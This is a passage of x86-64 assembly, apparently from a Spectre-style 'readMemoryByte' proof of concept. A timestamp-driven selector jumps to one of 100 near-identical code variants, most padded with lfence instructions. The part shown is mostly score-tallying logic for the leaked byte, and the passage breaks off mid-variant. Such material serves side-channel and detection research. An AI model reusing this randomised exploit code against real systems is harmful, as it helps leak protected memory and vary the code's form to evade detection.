	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 96
.LreadMemoryByte_win5_var96:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 97
.LreadMemoryByte_win5_var97:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 98
.LreadMemoryByte_win5_var98:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 99
.LreadMemoryByte_win5_var99:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
.LreadMemoryByte_win5_continue:
	addq	$32, %rsp
	jmp	.L19
.L24:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win4_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win4_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win4_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win4_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win4_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win4_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win4_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win4_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win4_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win4_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win4_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win4_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win4_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win4_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win4_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win4_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win4_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win4_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win4_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win4_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win4_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win4_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win4_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win4_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win4_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win4_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win4_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win4_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win4_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win4_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win4_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win4_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win4_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win4_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win4_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win4_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win4_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win4_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win4_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win4_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win4_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win4_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win4_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win4_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win4_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win4_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win4_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win4_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win4_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win4_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win4_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win4_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win4_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win4_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win4_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win4_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win4_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win4_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win4_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win4_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win4_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win4_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win4_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win4_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win4_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win4_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win4_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win4_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win4_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win4_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win4_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win4_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win4_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win4_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win4_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win4_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win4_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win4_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win4_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win4_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win4_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win4_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win4_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win4_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win4_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win4_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win4_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win4_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win4_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win4_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win4_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win4_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win4_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win4_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win4_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win4_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win4_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win4_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win4_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win4_var99
	jmp	.LreadMemoryByte_win4_var0
## Variant 0
.LreadMemoryByte_win4_var0:
	popq	%rax
	cmpl	$0, -92(%rbp)
	js	.L20
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 1
.LreadMemoryByte_win4_var1:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 2
.LreadMemoryByte_win4_var2:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 3
.LreadMemoryByte_win4_var3:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 4
.LreadMemoryByte_win4_var4:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 5
.LreadMemoryByte_win4_var5:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 6
.LreadMemoryByte_win4_var6:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 7
.LreadMemoryByte_win4_var7:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 8
.LreadMemoryByte_win4_var8:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 9
.LreadMemoryByte_win4_var9:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 10
.LreadMemoryByte_win4_var10:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 11
.LreadMemoryByte_win4_var11:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 12
.LreadMemoryByte_win4_var12:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 13
.LreadMemoryByte_win4_var13:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 14
.LreadMemoryByte_win4_var14:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 15
.LreadMemoryByte_win4_var15:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 16
.LreadMemoryByte_win4_var16:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 17
.LreadMemoryByte_win4_var17:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 18
.LreadMemoryByte_win4_var18:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 19
.LreadMemoryByte_win4_var19:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 20
.LreadMemoryByte_win4_var20:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 21
.LreadMemoryByte_win4_var21:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 22
.LreadMemoryByte_win4_var22:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 23
.LreadMemoryByte_win4_var23:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 24
.LreadMemoryByte_win4_var24:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 25
.LreadMemoryByte_win4_var25:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 26
.LreadMemoryByte_win4_var26:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 27
.LreadMemoryByte_win4_var27:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 28
.LreadMemoryByte_win4_var28:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 29
.LreadMemoryByte_win4_var29:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 30
.LreadMemoryByte_win4_var30:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 31
.LreadMemoryByte_win4_var31:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 32
.LreadMemoryByte_win4_var32:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 33
.LreadMemoryByte_win4_var33:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 34
.LreadMemoryByte_win4_var34:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 35
.LreadMemoryByte_win4_var35:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 36
.LreadMemoryByte_win4_var36:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 37
.LreadMemoryByte_win4_var37:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 38
.LreadMemoryByte_win4_var38:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 39
.LreadMemoryByte_win4_var39:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 40
.LreadMemoryByte_win4_var40:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 41
.LreadMemoryByte_win4_var41:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 42
.LreadMemoryByte_win4_var42:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 43
.LreadMemoryByte_win4_var43:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 44
.LreadMemoryByte_win4_var44:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 45
.LreadMemoryByte_win4_var45:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 46
.LreadMemoryByte_win4_var46:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 47
.LreadMemoryByte_win4_var47:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 48
.LreadMemoryByte_win4_var48:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 49
.LreadMemoryByte_win4_var49:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 50
.LreadMemoryByte_win4_var50:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 51
.LreadMemoryByte_win4_var51:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 52
.LreadMemoryByte_win4_var52:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 53
.LreadMemoryByte_win4_var53:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 54
.LreadMemoryByte_win4_var54:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 55
.LreadMemoryByte_win4_var55:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 56
.LreadMemoryByte_win4_var56:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 57
.LreadMemoryByte_win4_var57:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 58
.LreadMemoryByte_win4_var58:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 59
.LreadMemoryByte_win4_var59:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
